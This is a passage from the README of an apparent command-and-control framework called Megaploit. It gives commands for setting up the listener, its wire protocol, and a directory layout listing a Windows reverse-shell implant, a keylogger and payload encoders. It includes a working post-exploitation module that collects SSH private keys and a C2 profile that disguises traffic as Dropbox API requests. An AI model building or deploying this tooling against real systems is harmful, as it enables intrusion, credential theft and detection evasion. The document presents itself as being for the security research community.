openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
python3 server.py -lh 10.0.0.1 -p 4444 --cert cert.pem --key key.pem
```

### Rate Limiter & IP Allowlist
5 failed attempts per 60s → auto-ban for 300s.

```bash
python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.20
```

---

## Wire Protocol

```
[ uint32 length (4 bytes, big-endian) ][ AES-256-GCM ciphertext ]

Inside ciphertext:
[ uint64 sequence_number ][ JSON payload ]

WebSocket framing (WsTransport):
HTTP Upgrade → RFC 6455 binary frames → C2 framing inside frame payload
```

---

## Directory Layout

```
Megaploit-main/
├── server.py / agent.py / secret.key / requirements.txt / install.sh
│
├── C-remote-shell/                # Hardened Windows reverse shell (C)
│   ├── client/                    # Windows implant (target-side)
│   │   ├── config.h               # C2 IP, port, key path, reconnect delay
│   │   ├── ntcalls.h / ntcalls.c  # NT syscall loader + privilege check
│   │   ├── shell.h / shell.c      # strncmp() verb dispatch + _popen fallback
│   │   │                          #   ← source of truth for c_probe verb extraction
│   │   └── main.c                 # WinMain: mutex, Winsock, embedded key, reconnect loop
│   ├── tls/                       # Windows-native TLS transport (no OpenSSL)
│   │   ├── tls_client.h           # TLS_CONTEXT + 4-function public API
│   │   └── tls_client.c           # SChannel TLS 1.2/1.3, BCrypt AES-GCM + HMAC-SHA256
│   ├── server/                    # Standalone operator console (Linux / macOS)
│   │   ├── config.h               # LISTEN_PORT, LISTEN_ADDR
│   │   ├── server.h / server.c    # socket / bind / listen / accept
│   │   ├── prompt.h / prompt.c    # stdin → send → recv → print loop
│   │   └── main.c                 # Entry point
│   ├── Makefile                   # MSVC + MinGW build; C2_IP/C2_PORT overrides
│   ├── definitions.h              # Compatibility shim
│   ├── CHANGELOG.md               # Full bug-fix log, developer guide, probe docs
│   └── README.md                  # C-remote-shell documentation
│
├── tests/                         # 282 tests — pytest
│   ├── test_improvements.py       # NEW v3: 61 tests for all 7 new systems
│   ├── test_commands.py           # 39 tests for dispatch/all_commands
│   ├── test_db.py / test_autorun.py / test_jobs.py
│   ├── test_modules_base.py / test_modules_registry.py
│   ├── test_payload_builder.py / test_payload_encoders.py
│   ├── test_protocol.py / test_reporting.py
│   └── conftest.py
│
├── docs/
│   ├── ARCHITECTURE.md
│   ├── CLI_REFERENCE.md
│   ├── MODULE_SYSTEM.md
│   ├── PAYLOAD_BUILDER.md
│   ├── WEB_DASHBOARD.md
│   ├── C2_PROFILE.md              # NEW v3
│   └── PIPELINE.md                # NEW v3
│
└── megaploit/
    ├── core/
    │   ├── protocol.py            # WsTransport added (NEW v3)
    │   ├── pipeline.py            # Post-exploitation pipeline (NEW v3)
    │   ├── profile.py             # Malleable C2 profile (NEW v3)
    │   ├── c_probe.py             # C source compliance prober + verb extractor (NEW)
    │   ├── autorun.py / jobs.py / staging.py / crypto.py / config.py
    ├── server/
    │   ├── cli.py                 # stage0 fixed + pipeline cmd (NEW v3)
    │   └── commands.py            # C-exclusive cmds auto-registered via c_probe (NEW)
    │   └── listener.py / session.py
    ├── agent/
    │   ├── go_agent/main.go       # Build integration via payload builder (NEW v3)
    │   └── connection.py / handlers.py / keylogger.py / shell.py
    ├── modules/
    │   ├── base.py                # AgentModule added (NEW v3)
    │   ├── registry.py / auxiliary/
    ├── payload/
    │   ├── builder.py             # go_exe / go_elf / c_exe formats (NEW)
    │   └── encoders.py
    ├── db/ / reporting/ / web/ / streaming/ / toolbox/ / plugins/
```

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.

### Adding a Post-Exploitation Module (v3 way)

```python
from megaploit.modules.base import AgentModule, ModuleType, OptionType

class GatherSSHKeys(AgentModule):
    name        = "post/linux/gather_ssh_keys"
    description = "Collect SSH private keys from ~/.ssh/"
    module_type = ModuleType.POST
    platform    = ["linux"]

    def run(self, session=None):
        self.validate()
        sess = session or self.session
        keys = self._send("shell ls ~/.ssh/", sess)
        for fname in keys.splitlines():
            fname = fname.strip()
            if fname.endswith((".pem", ".key", "id_rsa", "id_ed25519")):
                content = self._send(f"shell cat ~/.ssh/{fname}", sess)
                self._ok(f"key: {fname}", content=content)
        return self.results

MODULE = GatherSSHKeys
```

### Writing a C2 Profile

```yaml
name: "DropboxAPI"
sleep: 30
jitter_max: 10
uri_paths:
  - "/2/files/list_folder"
  - "/2/files/download"
request_headers:
  Host: "api.dropboxapi.com"
  User-Agent: "OfficialDropboxPythonSDK/11.36.0"
  Content-Type: "application/json"
```

### Running Tests

```bash
pip install pytest
pytest tests/ -v --tb=short         # all 282 tests
pytest tests/test_improvements.py   # v3 new systems (61 tests)
```

---

*Made with ❤️ for the security research community.*
